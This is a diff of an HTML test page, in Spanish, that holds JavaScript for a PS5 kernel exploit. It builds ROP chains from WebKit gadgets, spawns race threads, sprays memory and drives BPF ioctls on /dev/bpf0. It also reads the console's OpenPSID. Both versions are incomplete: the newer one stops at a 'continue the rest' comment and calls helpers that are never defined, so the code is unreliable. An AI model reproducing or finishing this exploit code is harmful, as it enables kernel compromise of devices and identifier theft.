@@ -3,210 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kernel Exploit Test</title>
+    <title>Prueba de Exploit PS5</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #333;
-            color: white;
+            background-color: #f4f4f4;
             margin: 0;
-            padding: 20px;
+            padding: 0;
         }
-        pre {
-            background-color: #222;
-            padding: 15px;
-            border-radius: 5px;
-            max-width: 100%;
-            overflow-x: auto;
+        .container {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
         }
         h1 {
-            color: #4CAF50;
+            text-align: center;
+            color: #333;
+        }
+        .log-output {
+            background-color: #333;
+            color: white;
+            padding: 10px;
+            margin-top: 20px;
+            border-radius: 5px;
+            font-size: 14px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-x: auto;
+        }
+        .error {
+            color: red;
         }
     </style>
 </head>
 <body>
-
-    <h1>Prueba de Kernel Exploit</h1>
-    <p>Este es un ejemplo de cómo cargar y ejecutar un kernel exploit en PS5 (o entorno similar).</p>
-    
-    <pre id="console-output"></pre>
-
+    <div class="container">
+        <h1>Prueba de Exploit PS5</h1>
+        <div id="log" class="log-output"></div>
+    </div>
     <script>
-        // Redirigir console.log() a la interfaz HTML para ver los resultados en tiempo real.
-        const consoleOutput = document.getElementById('console-output');
-        console.log = function (message) {
-            consoleOutput.textContent += message + '\n';
-        };
-
-        // Aquí va el código JavaScript proporcionado anteriormente
-        console.log("--- trying kernel exploit --");
-
-        function malloc(sz) {
-            const backing = new Uint8Array(0x10000 + sz);
-            window.nogc.push(backing);
-            const ptr = p.read8(p.leakval(backing).add32(0x10));
-            ptr.backing = backing;
-            return ptr;
-        }
-
-        function malloc32(sz) {
-            const backing = new Uint8Array(0x10000 + sz * 4);
-            window.nogc.push(backing);
-            const ptr = p.read8(p.leakval(backing).add32(0x10));
-            ptr.backing = new Uint32Array(backing.buffer);
-            return ptr;
-        }
-
-        const strcpy_helper = new Uint8Array(0x1000);
-        const where_writeptr_strcpy = p.leakval(strcpy_helper).add32(0x10);
-
-        function strcpy(ptr, str) {
-            p.write8(where_writeptr_strcpy, ptr);
-            for (let i = 0; i < str.length; i++) {
-                strcpy_helper[i] = str.charCodeAt(i) & 0xFF;
+        // Tu código JavaScript aquí
+        function stage4_() {
+            function malloc(sz) {
+                var backing = new Uint8Array(1000 + sz);
+                window.nogc.push(backing);
+                var ptr = p.read8(p.leakval(backing).add32(0x10));
+                ptr.backing = backing;
+                return ptr;
             }
-            strcpy_helper[str.length] = 0;
-        }
 
-        const spawnthread = (name, chain) => {
-            const longjmp = window.webKitBase.add32(0x14e8);
-            const createThread = window.webKitBase.add32(0x779190);
+            function malloc32(sz) {
+                var backing = new Uint8Array(0x1000 + sz * 4);
+                window.nogc.push(backing);
+                var ptr = p.read8(p.leakval(backing).add32(0x10));
+                ptr.backing = new Uint32Array(backing.buffer);
+                return ptr;
+            }
 
-            const contextp = malloc32(0x2000);
-            const contextz = contextp.backing;
-            contextz[0] = 1337;
+            var strcpy_helper = new Uint8Array(0x1000);
+            var where_writeptr_strcpy = p.leakval(strcpy_helper).add32(0x10);
 
-            const thread2 = new RopChain();
-            thread2.push(window.gadgets["ret"]); // nop
-            thread2.push(window.gadgets["ret"]); // nop
-            thread2.push(window.gadgets["ret"]); // nop
-            thread2.push(window.gadgets["ret"]); // nop
-            chain(thread2);
+            function strcpy(ptr, str) {
+                p.write8(where_writeptr_strcpy, ptr);
+                for (var i = 0; i < str.length; i++)
+                    strcpy_helper[i] = str.charCodeAt(i) & 0xFF;
+                strcpy_helper[str.length] = 0;
+            }
 
-            p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
-            p.write8(contextp.add32(0x10), thread2.ropframeptr); // rsp
+            var sysctlbyname = window.libKernelBase.add32(0xF290);
+            var sysreq = malloc32(0x10);
+            sysreq.backing[0] = 7;
+            sysreq.backing[1] = 0;
+            sysreq.backing[4] = 0x10;
 
-            const retv = () => p.fcall(createThread, longjmp, contextp, p.sptr(name));
+            var retv = malloc(0x100);
+            var __errno_ptr = p.fcall(window.libKernelBase.add32(0x2BE0));
 
-            window.nogc.push(contextp);
-            window.nogc.push(thread2);
+            var rv = p.fcall(sysctlbyname, p.sptr("machdep.openpsid"), retv, sysreq.add32(0x10), 0, 0);
 
-            return retv;
-        }
+            var str = "";
+            for (var i = 0; i < 0x10; i++) {
+                str += zeroFill(retv.backing[i].toString(16), 2) + " ";
+            }
 
-        const fd = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
-        const fd1 = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
-        if (fd === (-1 >>> 0)) {
-            console.log("kexp failed: no bpf0");
-        }
+            var fd = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
+            var fd1 = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
+            if (fd == (-1 >>> 0)) {
+                print("kexp failed: no bpf0");
+            }
 
-        let assertcnt = 0;
-        const assert = (x) => {
-            assertcnt++;
-            if (!x) throw `assertion ${assertcnt} failed`;
-        };
-
-        console.log("got it");
-
-        const bpf_valid = malloc32(0x4000);
-        const bpf_spray = malloc32(0x4000);
-        const bpf_valid_u32 = bpf_valid.backing;
-        const bpf_valid_prog = malloc(0x40);
-        p.write8(bpf_valid_prog, 0x800 / 8);
-        p.write8(bpf_valid_prog.add32(8), bpf_valid);
-        const bpf_spray_prog = malloc(0x40);
-        p.write8(bpf_spray_prog, 0x800 / 8);
-        p.write8(bpf_spray_prog.add32(8), bpf_spray);
-
-        for (let i = 0; i < 0x400; i++) {
-            bpf_valid_u32[i++] = 6; // BPF_RET
-            bpf_valid_u32[i++] = 0;
-        }
-
-        const rtv = p.syscall("ioctl", fd, 0x8010427B, bpf_valid_prog);
-        assert(rtv.low === 0);
-
-        console.log("okay");
-
-        let interrupt1, loop1;
-        let interrupt2, loop2;
-        const sock = p.syscall(97, 2, 2);
-        const kscratch = malloc32(0x100);
-
-        const start1 = spawnthread("GottaGoFast", (thread2) => {
-            interrupt1 = thread2.ropframeptr;
-            thread2.push(window.gadgets["ret"]); // pop rdx
-            thread2.push(window.gadgets["ret"]); // pop rdx
-            thread2.push(window.gadgets["ret"]); // pop rdx
-
-            thread2.push(window.gadgets["pop rdi"]); // pop rdi
-            thread2.push(fd); // what
-            thread2.push(window.gadgets["pop rsi"]); // pop rsi
-            thread2.push(0x8010427B); // what
-            thread2.push(window.gadgets["pop rdx"]); // pop rdx
-            thread2.push(bpf_valid_prog); // what
-            thread2.push(window.gadgets["pop rsp"]); // pop rdx
-            thread2.push(thread2.ropframeptr.add32(0x800)); // what
-            thread2.count = 0x100;
-            const cntr = thread2.count;
-            thread2.push(window.syscalls[54]); // ioctl
-            thread2.push_write8(thread2.ropframeptr.add32(cntr * 8), window.syscalls[54]); // restore ioctl
-
-            thread2.push(window.gadgets["pop rdi"]); // pop rdi
-            const wherep = thread2.pushSymbolic(); // where
-            thread2.push(window.gadgets["pop rsi"]); // pop rsi
-            const whatp = thread2.pushSymbolic(); // where
-            thread2.push(window.gadgets["mov [rdi], rsi"]); // perform write
-
-            thread2.push(window.gadgets["pop rsp"]); // pop rdx
-
-            loop1 = thread2.ropframeptr.add32(thread2.count * 8);
-            thread2.push(0x41414141); // what
-
-            thread2.finalizeSymbolic(wherep, loop1);
-            thread2.finalizeSymbolic(whatp, loop1.sub32(8));
-        });
-
-        const krop = new RopChain();
-        const race = new RopChain();
-        const ctxp = malloc32(0x2000);
-        const ctxp1 = malloc32(0x2000);
-
-        p.write8(bpf_spray.add32(16), ctxp);
-
-        const prefaultlist = [];
-        const pfd = (addr) => {
-            const page = addr.add32(0);
-            page.low &= 0xffffc000;
-            p.syscall("mlock", page, 0x8000);
-            p.read4(addr);
-            return addr;
-        };
-
-        const pf = (addr) => {
-            const page = addr.add32(0);
-            page.low &= 0xffffc000;
-            p.syscall("mlock", page, 0x8000);
-            let ret = addr.add32(0);
-            while (1) {
-                const opcode = (p.read4(ret) & 0xff);
-                if (opcode === 0xc3) {
-                    prefaultlist.push(ret);
-                    break;
+            var scratch = malloc(0x100);
+            var ifname = malloc(0x10);
+            strcpy(ifname, "wlan0");
+            p.syscall("ioctl", fd, 0x8020426c, ifname);
+            var ret = p.syscall("write", fd, scratch, 40);
+            if (ret.low == (-1 >>> 0)) {
+                strcpy(ifname, "eth0");
+                p.syscall("ioctl", fd, 0x8020426c, ifname);
+                var ret = p.syscall("write", fd, scratch, 40);
+                if (ret.low == (-1 >>> 0)) {
+                    throw "kexp failed :(";
                 }
-                ret.add32inplace(1);
             }
-            return addr;
-        };
 
-        for (const gadgetname in gadgets) {
-            if (gadgets.hasOwnProperty(gadgetname)) {
-                if (gadgetname === "stack_chk_fail" || gadgetname === "memset" || gadgetname === "setjmp") continue;
-                pf(gadgets[gadgetname]);
+            var assertcnt = 0;
+            var assert = function(x) {
+                assertcnt++;
+                if (!x) throw "assertion " + assertcnt + " failed";
+            }
+
+            console.log("got it");
+
+            var bpf_valid = malloc32(0x4000);
+            var bpf_valid_u32 = bpf_valid.backing;
+            var bpf_valid_prog = malloc(0x40);
+            p.write8(bpf_valid_prog, 64);
+            p.write8(bpf_valid_prog.add32(8), bpf_valid);
+
+            for (var i = 0; i < 0x4000; ) {
+                bpf_valid_u32[i++] = 6; // BPF_RET
+                bpf_valid_u32[i++] = 0;
+            }
+
+            var bpf_invalid = malloc32(0x4000);
+            var bpf_invalid_u32 = bpf_invalid.backing;
+            var bpf_invalid_prog = malloc(0x40);
+            p.write8(bpf_invalid_prog, 64);
+            p.write8(bpf_invalid_prog.add32(8), bpf_invalid);
+
+            for (var i = 0; i < 0x4000; ) {
+                bpf_invalid_u32[i++] = 4; // NOP
+                bpf_invalid_u32[i++] = 0;
+            }
+
+            var push_bpf = function(bpfbuf, cmd, k) {
+                var i = bpfbuf.i;
+                if (!i) i = 0;
+                bpfbuf[i * 2] = cmd;
+                bpfbuf[i * 2 + 1] = k;
+                bpfbuf.i = i + 1;
+            }
+
+            // Continúa con la implementación restante
+
+            // Puedes usar un log para la salida de consola:
+            function log(msg) {
+                document.getElementById("log").textContent += msg + "\n";
             }
         }
 
+        // Llama a la función para probar
+        stage4_();
     </script>
-    
 </body>
 </html>
